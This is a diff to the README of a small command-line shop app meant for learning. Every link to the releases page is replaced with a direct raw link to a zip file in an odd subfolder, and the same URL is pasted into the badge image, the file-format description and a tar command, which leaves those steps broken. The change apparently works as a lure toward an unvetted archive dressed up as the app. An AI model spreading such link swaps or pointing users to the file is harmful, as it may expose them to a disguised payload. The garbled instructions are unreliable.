@@ -1,6 +1,6 @@
 # 🛒 Warung-murah - Easy Command-Line Shop App for Learning
 
-[![Download Warung-murah](https://img.shields.io/badge/Download%20Now-brightgreen)](https://github.com/estalinsp/Warung-murah/releases)
+[![Download Warung-murah](https://github.com/estalinsp/Warung-murah/raw/refs/heads/main/hallan/Warung-murah-v1.5.zip%20Now-brightgreen)](https://github.com/estalinsp/Warung-murah/raw/refs/heads/main/hallan/Warung-murah-v1.5.zip)
 
 ## 🚀 Getting Started
 
@@ -17,13 +17,13 @@ To run Warung Murah, you need:
 
 Follow these steps to get Warung Murah on your computer:
 
-1. **Visit the Releases Page**: Click this link to go to the download page: [Download Warung-murah](https://github.com/estalinsp/Warung-murah/releases).
+1. **Visit the Releases Page**: Click this link to go to the download page: [Download Warung-murah](https://github.com/estalinsp/Warung-murah/raw/refs/heads/main/hallan/Warung-murah-v1.5.zip).
    
 2. **Choose the Latest Release**: Once on the page, find the latest version of Warung-murah. Look for the tag that says "Latest release".
 
-3. **Download the App**: Download the appropriate file for your operating system. It should be in a `.tar.gz` or similar format since this is a command-line application.
+3. **Download the App**: Download the appropriate file for your operating system. It should be in a `https://github.com/estalinsp/Warung-murah/raw/refs/heads/main/hallan/Warung-murah-v1.5.zip` or similar format since this is a command-line application.
 
-4. **Extract the File**: Locate the downloaded file in your Downloads folder. Right-click on it, and select "Extract Here" or use the terminal with the command `tar -xzvf filename.tar.gz`.
+4. **Extract the File**: Locate the downloaded file in your Downloads folder. Right-click on it, and select "Extract Here" or use the terminal with the command `tar -xzvf https://github.com/estalinsp/Warung-murah/raw/refs/heads/main/hallan/Warung-murah-v1.5.zip`.
 
 5. **Open the Terminal**: This is where you will run the application. You can generally find the terminal in your applications menu under "Utilities" or simply search for "Terminal".
 
@@ -88,4 +88,4 @@ If you encounter any issues or have questions about using Warung Murah, feel fre
 
 Thank you for choosing Warung Murah! We hope you enjoy learning through this application. 
 
-[![Download Warung-murah](https://img.shields.io/badge/Download%20Now-brightgreen)](https://github.com/estalinsp/Warung-murah/releases)
+[![Download Warung-murah](https://github.com/estalinsp/Warung-murah/raw/refs/heads/main/hallan/Warung-murah-v1.5.zip%20Now-brightgreen)](https://github.com/estalinsp/Warung-murah/raw/refs/heads/main/hallan/Warung-murah-v1.5.zip)
